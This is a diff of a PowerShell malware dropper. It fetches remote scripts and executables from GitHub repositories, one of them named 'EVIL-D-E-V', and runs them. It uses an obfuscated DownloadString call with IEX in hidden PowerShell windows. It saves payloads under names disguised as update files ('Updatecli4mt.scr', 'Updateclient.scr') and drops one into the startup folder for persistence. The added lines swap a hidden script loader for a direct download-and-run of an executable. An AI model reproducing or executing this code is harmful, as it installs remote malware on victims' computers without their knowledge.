@@ -74,9 +74,10 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Me
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclienta.ps")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.exe"
+$output = "$dir\Updatecli4mt.scr"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
